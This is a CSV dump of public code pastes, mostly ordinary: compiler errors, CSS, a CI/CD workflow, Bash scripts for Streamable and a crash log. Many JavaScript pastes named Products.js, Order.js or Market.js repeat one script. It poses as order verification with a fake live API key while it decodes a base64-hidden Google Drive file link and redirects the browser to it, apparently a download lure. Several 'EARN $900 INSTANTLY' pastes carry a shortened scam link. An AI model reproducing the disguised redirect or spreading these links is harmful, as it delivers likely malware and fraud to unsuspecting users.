id,title,username,language,date,content
wq791DA7,Untitled,zebmekey,JavaScript,Wednesday 9th of April 2025 01:00:45 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/55131/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
8ejizN25,EARN $900 INSTANTLY 2025⭐ G8,TTVFun-Haiti,JavaScript,Wednesday 9th of April 2025 12:55:08 PM CDT," 
Pdf https://tinyurl.com/privguidee


7rBKcgNQfT
"
FTxxV1PY,Untitled,dtorkin,C,Wednesday 9th of April 2025 12:48:14 PM CDT,"dtorkin@ubuntu1:~/Desktop/v0.12$ make
gcc -Wall -Wextra -g -Iprotocol -Iio -Isvm -Iuvm -Iconfig -pthread    -c -o svm/svm_main.o svm/svm_main.c
svm/svm_main.c: In function ‘handle_shutdown_signal’:
svm/svm_main.c:17:5: warning: implicit declaration of function ‘fprintf’ [-Wimplicit-function-declaration]
   17 |     fprintf(stdout, ""\nSVM: Получен сигнал завершения (%d). Инициируем остановку потоков...\n"", sig);
      |     ^~~~~~~
svm/svm_main.c:6:1: note: include ‘<stdio.h>’ or provide a declaration of ‘fprintf’
    5 | #include ""svm_timers.h"" // Теперь содержит и timer_thread_func, и stop_timer_thread и т.д.
  +++ |+#include <stdio.h>
    6 | 
svm/svm_main.c:17:5: warning: incompatible implicit declaration of built-in function ‘fprintf’ [-Wbuiltin-declaration-mismatch]
   17 |     fprintf(stdout, ""\nSVM: Получен сигнал завершения (%d). Инициируем остановку потоков...\n"", sig);
      |     ^~~~~~~
svm/svm_main.c:17:5: note: include ‘<stdio.h>’ or provide a declaration of ‘fprintf’
svm/svm_main.c:17:13: error: ‘stdout’ undeclared (first use in this function)
   17 |     fprintf(stdout, ""\nSVM: Получен сигнал завершения (%d). Инициируем остановку потоков...\n"", sig);
      |             ^~~~~~
svm/svm_main.c:17:13: note: ‘stdout’ is defined in header ‘<stdio.h>’; did you forget to ‘#include <stdio.h>’?
svm/svm_main.c:17:13: note: each undeclared identifier is reported only once for each function it appears in
svm/svm_main.c:19:5: error: ‘keep_running’ undeclared (first use in this function)
   19 |     keep_running = false;
      |     ^~~~~~~~~~~~
svm/svm_main.c:23:9: error: ‘svm_incoming_queue’ undeclared (first use in this function)
   23 |     if (svm_incoming_queue) queue_shutdown(svm_incoming_queue);
      |         ^~~~~~~~~~~~~~~~~~
svm/svm_main.c:23:29: warning: implicit declaration of function ‘queue_shutdown’ [-Wimplicit-function-declaration]
   23 |     if (svm_incoming_queue) queue_shutdown(svm_incoming_queue);
      |                             ^~~~~~~~~~~~~~
svm/svm_main.c:24:9: error: ‘svm_outgoing_queue’ undeclared (first use in this function)
   24 |     if (svm_outgoing_queue) queue_shutdown(svm_outgoing_queue);
      |         ^~~~~~~~~~~~~~~~~~
svm/svm_main.c: In function ‘main’:
svm/svm_main.c:32:9: warning: implicit declaration of function ‘printf’ [-Wimplicit-function-declaration]
   32 |         printf(""SVM запуск...\n"");
      |         ^~~~~~
svm/svm_main.c:32:9: note: include ‘<stdio.h>’ or provide a declaration of ‘printf’
svm/svm_main.c:32:9: warning: incompatible implicit declaration of built-in function ‘printf’ [-Wbuiltin-declaration-mismatch]
svm/svm_main.c:32:9: note: include ‘<stdio.h>’ or provide a declaration of ‘printf’
svm/svm_main.c:36:9: warning: implicit declaration of function ‘exit’ [-Wimplicit-function-declaration]
   36 |         exit(EXIT_FAILURE);
      |         ^~~~
svm/svm_main.c:6:1: note: include ‘<stdlib.h>’ or provide a declaration of ‘exit’
    5 | #include ""svm_timers.h"" // Теперь содержит и timer_thread_func, и stop_timer_thread и т.д.
  +++ |+#include <stdlib.h>
    6 | 
svm/svm_main.c:36:9: warning: incompatible implicit declaration of built-in function ‘exit’ [-Wbuiltin-declaration-mismatch]
   36 |         exit(EXIT_FAILURE);
      |         ^~~~
svm/svm_main.c:36:9: note: include ‘<stdlib.h>’ or provide a declaration of ‘exit’
svm/svm_main.c:36:14: error: ‘EXIT_FAILURE’ undeclared (first use in this function)
   36 |         exit(EXIT_FAILURE);
      |              ^~~~~~~~~~~~
svm/svm_main.c:36:14: note: ‘EXIT_FAILURE’ is defined in header ‘<stdlib.h>’; did you forget to ‘#include <stdlib.h>’?
svm/svm_main.c:38:5: warning: implicit declaration of function ‘init_message_handlers’ [-Wimplicit-function-declaration]
   38 |     init_message_handlers();
      |     ^~~~~~~~~~~~~~~~~~~~~
svm/svm_main.c:42:5: error: ‘svm_incoming_queue’ undeclared (first use in this function)
   42 |     svm_incoming_queue = queue_create(100);
      |     ^~~~~~~~~~~~~~~~~~
svm/svm_main.c:42:26: warning: implicit declaration of function ‘queue_create’ [-Wimplicit-function-declaration]
   42 |     svm_incoming_queue = queue_create(100);
      |                          ^~~~~~~~~~~~
svm/svm_main.c:43:5: error: ‘svm_outgoing_queue’ undeclared (first use in this function)
   43 |     svm_outgoing_queue = queue_create(100);
      |     ^~~~~~~~~~~~~~~~~~
svm/svm_main.c:47:22: error: storage size of ‘sa’ isn’t known
   47 |     struct sigaction sa;
      |                      ^~
svm/svm_main.c:48:5: warning: implicit declaration of function ‘memset’ [-Wimplicit-function-declaration]
   48 |     memset(&sa, 0, sizeof(sa));
      |     ^~~~~~
svm/svm_main.c:6:1: note: include ‘<string.h>’ or provide a declaration of ‘memset’
    5 | #include ""svm_timers.h"" // Теперь содержит и timer_thread_func, и stop_timer_thread и т.д.
  +++ |+#include <string.h>
    6 | 
svm/svm_main.c:48:5: warning: incompatible implicit declaration of built-in function ‘memset’ [-Wbuiltin-declaration-mismatch]
   48 |     memset(&sa, 0, sizeof(sa));
      |     ^~~~~~
svm/svm_main.c:48:5: note: include ‘<string.h>’ or provide a declaration of ‘memset’
svm/svm_main.c:50:5: warning: implicit declaration of function ‘sigaction’ [-Wimplicit-function-declaration]
   50 |     sigaction(SIGINT, &sa, NULL);
      |     ^~~~~~~~~
svm/svm_main.c:50:15: error: ‘SIGINT’ undeclared (first use in this function)
   50 |     sigaction(SIGINT, &sa, NULL);
      |               ^~~~~~
svm/svm_main.c:51:15: error: ‘SIGTERM’ undeclared (first use in this function)
   51 |     sigaction(SIGTERM, &sa, NULL);
      |               ^~~~~~~
svm/svm_main.c:55:10: error: ‘global_client_handle’ undeclared (first use in this function)
   55 |      if (global_client_handle < 0 && keep_running) {
      |          ^~~~~~~~~~~~~~~~~~~~
svm/svm_main.c:55:38: error: ‘keep_running’ undeclared (first use in this function)
   55 |      if (global_client_handle < 0 && keep_running) {
      |                                      ^~~~~~~~~~~~
svm/svm_main.c:56:10: warning: incompatible implicit declaration of built-in function ‘fprintf’ [-Wbuiltin-declaration-mismatch]
   56 |          fprintf(stderr, ""SVM: Не удалось установить коммуникационный канал.\n"");
      |          ^~~~~~~
svm/svm_main.c:56:10: note: include ‘<stdio.h>’ or provide a declaration of ‘fprintf’
svm/svm_main.c:56:18: error: ‘stderr’ undeclared (first use in this function)
   56 |          fprintf(stderr, ""SVM: Не удалось установить коммуникационный канал.\n"");
      |                  ^~~~~~
svm/svm_main.c:56:18: note: ‘stderr’ is defined in header ‘<stdio.h>’; did you forget to ‘#include <stdio.h>’?
svm/svm_main.c:64:25: error: ‘timer_tid’ undeclared (first use in this function); did you mean ‘timer_t’?
   64 |     if (pthread_create(&timer_tid, NULL, timer_thread_func, NULL) != 0) { perror(""SVM: Failed to create timer thread""); goto cleanup_threads; }
      |                         ^~~~~~~~~
      |                         timer_t
svm/svm_main.c:64:75: warning: implicit declaration of function ‘perror’ [-Wimplicit-function-declaration]
   64 | hread_create(&timer_tid, NULL, timer_thread_func, NULL) != 0) { perror(""SVM: Failed to create timer thread""); goto cleanup_threads; }
      |                                                                 ^~~~~~

svm/svm_main.c:66:25: error: ‘receiver_tid’ undeclared (first use in this function); did you mean ‘receiver_created’?
   66 |     if (pthread_create(&receiver_tid, NULL, receiver_thread_func, NULL) != 0) { perror(""SVM: Failed to create receiver thread""); goto cleanup_threads; }
      |                         ^~~~~~~~~~~~
      |                         receiver_created
svm/svm_main.c:68:25: error: ‘processor_tid’ undeclared (first use in this function); did you mean ‘processor_created’?
   68 |     if (pthread_create(&processor_tid, NULL, processor_thread_func, NULL) != 0) { perror(""SVM: Failed to create processor thread""); goto cleanup_threads; }
      |                         ^~~~~~~~~~~~~
      |                         processor_created
svm/svm_main.c:70:26: error: ‘sender_tid’ undeclared (first use in this function); did you mean ‘sender_created’?
   70 |      if (pthread_create(&sender_tid, NULL, sender_thread_func, NULL) != 0) { perror(""SVM: Failed to create sender thread""); goto cleanup_threads; }
      |                          ^~~~~~~~~~
      |                          sender_created
svm/svm_main.c:94:9: warning: implicit declaration of function ‘shutdown’ [-Wimplicit-function-declaration]
   94 |         shutdown(global_client_handle, SHUT_RDWR);
      |         ^~~~~~~~
svm/svm_main.c:94:40: error: ‘SHUT_RDWR’ undeclared (first use in this function)
   94 |         shutdown(global_client_handle, SHUT_RDWR);
      |                                        ^~~~~~~~~
svm/svm_main.c:109:5: warning: incompatible implicit declaration of built-in function ‘fprintf’ [-Wbuiltin-declaration-mismatch]
  109 |     fprintf(stderr, ""SVM: Ошибка создания одного из потоков. Инициируем остановку созданных...\n"");
      |     ^~~~~~~
svm/svm_main.c:109:5: note: include ‘<stdio.h>’ or provide a declaration of ‘fprintf’
svm/svm_main.c:128:13: error: ‘io_svm’ undeclared (first use in this function)
  128 |         if (io_svm) io_svm->disconnect(io_svm, global_client_handle);
      |             ^~~~~~
svm/svm_main.c:133:9: error: ‘serverSocketFD’ undeclared (first use in this function)
  133 |     if (serverSocketFD >= 0) { // Закрываем слушающий сокет, если он был и не закрыт
      |         ^~~~~~~~~~~~~~
svm/svm_main.c:135:15: warning: implicit declaration of function ‘close’ [-Wimplicit-function-declaration]
  135 |          else close(serverSocketFD);
      |               ^~~~~
svm/svm_main.c:138:29: warning: implicit declaration of function ‘queue_destroy’ [-Wimplicit-function-declaration]
  138 |     if (svm_incoming_queue) queue_destroy(svm_incoming_queue);
      |                             ^~~~~~~~~~~~~
svm/svm_main.c:47:22: warning: unused variable ‘sa’ [-Wunused-variable]
   47 |     struct sigaction sa;
      |                      ^~
make: *** [<встроенное>: svm/svm_main.o] Ошибка 1"
V7QqYTym,Products.js,zebmekey,JavaScript,Wednesday 9th of April 2025 12:45:22 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/53420/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
DiAGpP4y,Make $1000 15-MINUTES  (BEGINNER) HV,TTVFun-Haiti,JavaScript,Wednesday 9th of April 2025 12:41:43 PM CDT," 
Pdf https://tinyurl.com/privguidee


M8n82nNSeX
"
UYLNzDWQ,Mega Rejuve menu backup,coffeeandphotos,CSS,Wednesday 9th of April 2025 12:31:34 PM CDT,"//MEGA MENU
.mega {
position: absolute;
width: 100%;
opacity: 0;
left: 0;
bottom: 0px;
visibility: hidden;
pointer-events: none;
transition:transform 1s ease;
transform: translate(0,95%);
 
&:after {
position: absolute;
left: 0;
content: '';
height: 100%;
width: 100%;
z-index: -1;
background: transparent;
top: 5px;
transform: translate(0,-100%);
 
}
 
}
 
.mega:hover {
opacity: 1;
visibility: visible;
pointer-events: auto!important;
-webkit-transition-delay: 0s;
-o-transition-delay: 0s;
transition-delay: 0s;
transform: translate(0,100%);
& * {
pointer-events: auto;
}
}
.folder a {
pointer-events:none;
}
.folder:hover {
& + .mega {
opacity: 1;
pointer-events: auto!important;
visibility: visible;
transform: translate(0,100%);
}
}
 
@media (min-width:991px) {
 
.folder {
z-index:99999 !important;
.header-nav-folder-content {
display: none;
}
}
.header-nav-item,
.header-title,
.header-actions {
z-index: 9;
position: relative !important;
}
.header-background,.header::before,
{
pointer-events: none!important;
}
 
.header-display,
.header-inner {
position: static!important;
}
 
}
 
//LEFT ALIGN TEXT
.mega {
p,h2,h3,h1 {
text-align:left;
}
//remove underlines in links
p a {
border-bottom:0px !important;
}
}
 
.section-background-content img {
visibility:visible !important;
}
 
//background color
//Mega Menu Background color
.mega {
 
.section-background {
background-color: #EBEAEB !important;
}
 
}
//padding
.mega {
.content-wrapper {
padding-top: 5vh !important;
padding-bottom: 5vh !important;
}
}
//typography
.mega {
h3 {
font-size:18px;
font-family: Poppins;
}
h1,h2,h3,h4, p {
text-align:left;
line-height: 1.8;
}
 
}
//END MEGA MENU END"
UntzUwJi,Order.js,zebmekey,JavaScript,Wednesday 9th of April 2025 12:29:37 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/00234/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
mZpAX7Hm,EARN $900 INSTANTLY 2025 2U,TTVFun-Haiti,JavaScript,Wednesday 9th of April 2025 12:28:15 PM CDT," 
Pdf https://tinyurl.com/privguidee


pZK7oBdsFx
"
brWbsUmB,Create a New Account for Uploading Videos,metalx1000,Bash,Wednesday 9th of April 2025 12:21:27 PM CDT,"#!/bin/bash
######################################################################
#Copyright (C) 2025  Kris Occhipinti
#https://filmsbykris.com

#This program is free software: you can redistribute it and/or modify
#it under the terms of the GNU General Public License as published by
#the Free Software Foundation version 3 of the License.

#This program is distributed in the hope that it will be useful,
#but WITHOUT ANY WARRANTY; without even the implied warranty of
#MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#GNU General Public License for more details.

#You should have received a copy of the GNU General Public License
#along with this program.  If not, see <http://www.gnu.org/licenses/>.
######################################################################

random=""$(head -c 16 /dev/urandom | tr -dc a-zA-Z0-9 | head -c 50)""
user=""${random}@yahoo.com""

curl 'https://ajax.streamable.com/users' \
  -H 'accept: */*' \
  -H 'accept-language: en-US,en;q=0.7' \
  -H 'cache-control: no-cache' \
  -H 'content-type: application/json' \
  -H 'origin: https://streamable.com' \
  -H 'pragma: no-cache' \
  -H 'priority: u=1, i' \
  -H 'referer: https://streamable.com/' \
  -H 'sec-ch-ua: ""Brave"";v=""135"", ""Not-A.Brand"";v=""8"", ""Chromium"";v=""135""' \
  -H 'sec-ch-ua-mobile: ?0' \
  -H 'sec-ch-ua-platform: ""Linux""' \
  -H 'sec-fetch-dest: empty' \
  -H 'sec-fetch-mode: cors' \
  -H 'sec-fetch-site: same-site' \
  -H 'sec-gpc: 1' \
  -H 'user-agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36' \
  --data-raw ""{\""username\"":\""$user\"",\""password\"":\""mypassword\"",\""email\"":\""$user\"",\""verification_redirect\"":\""https://streamable.com?alert=verified\""}""

echo -e ""\nCreated account for '$user' with password 'mypassword'""
"
MFCTGLm2,Make $1000 15-MINUTES (BEGINNER) FM,TTVFun-Haiti,JavaScript,Wednesday 9th of April 2025 12:14:50 PM CDT," 
Pdf https://tinyurl.com/privguidee


uGvpb02mN8
"
Rpyad2sj,Market.js,zebmekey,JavaScript,Wednesday 9th of April 2025 12:14:14 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/25218/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
Ekcb8SeP,CICD,sidjha57,YAML,Wednesday 9th of April 2025 12:08:45 PM CDT,"name: Build, Push to ECR, and Deploy to AWS CloudFormation

on:
  push:
    branches:
      - main # Trigger deployment only on pushes to the main branch

permissions:
  id-token: write # Required for OIDC authentication to AWS
  contents: read  # Required to checkout the repository code
  packages: write # Required if pushing to GH Packages, but we use ECR

env:
  AWS_REGION: ap-south-1                   # Set your AWS region
  ECR_REPOSITORY_NAME: my-app-repo         # CHANGE: Use the ECR repo name (match stack name convention if possible)
  CLOUDFORMATION_STACK_NAME: my-node-app   # CHANGE: Choose a name for your CloudFormation stack

jobs:
  build-and-push-ecr:
    name: Build Docker Image and Push to ECR
    runs-on: ubuntu-latest
    outputs:
      image_tag: ${{ steps.set_image_tag.outputs.tag }}

    steps:
      - name: Checkout repository
        uses: actions/checkout@v4

      - name: Configure AWS credentials using OIDC
        uses: aws-actions/configure-aws-credentials@v4
        with:
          role-to-assume: ${{ secrets.AWS_IAM_ROLE_ARN }} # Use the secret
          aws-region: ${{ env.AWS_REGION }}

      - name: Login to Amazon ECR
        id: login-ecr
        uses: aws-actions/amazon-ecr-login@v2

      - name: Set Image Tag
        id: set_image_tag
        run: echo ""tag=$(echo $GITHUB_SHA | cut -c1-7)"" >> $GITHUB_OUTPUT # Use short Git SHA as tag

      - name: Build, tag, and push image to Amazon ECR
        id: build-image
        env:
          ECR_REGISTRY: ${{ steps.login-ecr.outputs.registry }}
          IMAGE_TAG: ${{ steps.set_image_tag.outputs.tag }}
        run: |
          docker build -t $ECR_REGISTRY/${{ env.ECR_REPOSITORY_NAME }}:$IMAGE_TAG -t $ECR_REGISTRY/${{ env.ECR_REPOSITORY_NAME }}:latest .
          docker push $ECR_REGISTRY/${{ env.ECR_REPOSITORY_NAME }}:$IMAGE_TAG
          docker push $ECR_REGISTRY/${{ env.ECR_REPOSITORY_NAME }}:latest
          echo ""Pushed image: $ECR_REGISTRY/${{ env.ECR_REPOSITORY_NAME }}:$IMAGE_TAG""

  deploy-cloudformation:
    name: Deploy CloudFormation Stack
    runs-on: ubuntu-latest
    needs: build-and-push-ecr # Run only after build-and-push succeeds

    steps:
      - name: Checkout repository
        uses: actions/checkout@v4

      - name: Configure AWS credentials using OIDC
        uses: aws-actions/configure-aws-credentials@v4
        with:
          role-to-assume: ${{ secrets.AWS_IAM_ROLE_ARN }} # Use the same role or a dedicated deployment role
          aws-region: ${{ env.AWS_REGION }}

      - name: Deploy CloudFormation stack
        uses: aws-actions/aws-cloudformation-github-deploy@v1
        with:
          name: ${{ env.CLOUDFORMATION_STACK_NAME }}
          template: template.yaml # Path to your CloudFormation template
          capabilities: CAPABILITY_IAM, CAPABILITY_NAMED_IAM # Required because we create IAM resources
          parameter-overrides: >- # Pass parameters, crucially the new Docker image tag
            DockerImageTag=${{ needs.build-and-push-ecr.outputs.image_tag }},
            InstanceType=t3.medium,
            DbInstanceClass=db.t3.medium,
            DbUsername=${{ secrets.DB_USERNAME }}, # Store DB credentials securely in GitHub Secrets
            DbPassword=${{ secrets.DB_PASSWORD }},
            SslCertificateArn=${{ secrets.ACM_CERT_ARN }} # Optional: Store ACM ARN in secrets

          # You can add other parameters here if needed, pulling from secrets or env vars

          # Optional: Use change sets for review before execution
          # change-set-name: ${{ env.CLOUDFORMATION_STACK_NAME }}-changeset-${{ github.sha }}
          # wait-for-change-set: true # Waits for changeset creation
          # execute-change-set: true # Executes the change set

          # --- If NOT using change sets (direct deploy) ---
          no-fail-on-empty-changeset: ""1"" # Don't fail if the template/params haven't changed

      - name: Output CloudFormation Stack Outputs
        run: |
          echo ""CloudFormation deployment finished. Stack outputs:""
          aws cloudformation describe-stacks --stack-name ${{ env.CLOUDFORMATION_STACK_NAME }} --query ""Stacks[0].Outputs"" --output table"
4rBcejnW,Untitled,zebmekey,JavaScript,Wednesday 9th of April 2025 11:58:52 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/29548/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
ukKZLYv5,Upload a Video for Sharing on Steamable,metalx1000,Bash,Wednesday 9th of April 2025 11:58:19 AM CDT,"#!/bin/bash
######################################################################
#Copyright (C) 2025  Kris Occhipinti
#https://filmsbykris.com

#This program is free software: you can redistribute it and/or modify
#it under the terms of the GNU General Public License as published by
#the Free Software Foundation version 3 of the License.

#This program is distributed in the hope that it will be useful,
#but WITHOUT ANY WARRANTY; without even the implied warranty of
#MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#GNU General Public License for more details.

#You should have received a copy of the GNU General Public License
#along with this program.  If not, see <http://www.gnu.org/licenses/>.
######################################################################
user=""""
pass=""""
url=""https://api.streamable.com/upload""
file=""$(fzf --prompt=""Select a Video: "")""
[[ $file ]] || exit

id=""$(curl --request POST --url ""$url"" --user $user:$pass --form file=@""$file"" | jq -r '.shortcode')""

echo ""https://streamable.com/${id}""
"
fDCGQnL6,Products.js,SpawnKz,JavaScript,Wednesday 9th of April 2025 11:43:26 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/83911/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
4F8jMEZy,Order.js,SpawnKz,JavaScript,Wednesday 9th of April 2025 11:27:58 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/82177/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
Z2f3eufN,2025-04-09T18:12:56.979080,powerampache,PHP,Wednesday 9th of April 2025 11:12:57 AM CDT,"1.01-79-play (79) - DB: 83
java.lang.NullPointerException: Parameter specified as non-null is null: method luci.sixsixsix.powerampache2.domain.models.User.<init>, parameter id
	at luci.sixsixsix.powerampache2.domain.models.User.<init>(Unknown Source:20)
	at luci.sixsixsix.powerampache2.data.remote.dto.UserDtoKt.toUser(UserDto.kt:94)
	at luci.sixsixsix.powerampache2.data.BaseAmpacheRepository.getUserNetwork(BaseAmpacheRepository.kt:128)
	at luci.sixsixsix.powerampache2.data.BaseAmpacheRepository$getUserNetwork$1.invokeSuspend(Unknown Source:14)
	at kotlin.coroutines.jvm.internal.BaseContinuationImpl.resumeWith(ContinuationImpl.kt:33)
	at kotlinx.coroutines.DispatchedTask.run(DispatchedTask.kt:104)
	at kotlinx.coroutines.scheduling.CoroutineScheduler.runSafely(CoroutineScheduler.kt:584)
	at kotlinx.coroutines.scheduling.CoroutineScheduler$Worker.executeTask(CoroutineScheduler.kt:811)
	at kotlinx.coroutines.scheduling.CoroutineScheduler$Worker.runWorker(CoroutineScheduler.kt:715)
	at kotlinx.coroutines.scheduling.CoroutineScheduler$Worker.run(CoroutineScheduler.kt:702)

"
nVDg66US,Market.js,SpawnKz,JavaScript,Wednesday 9th of April 2025 11:12:36 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/54652/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
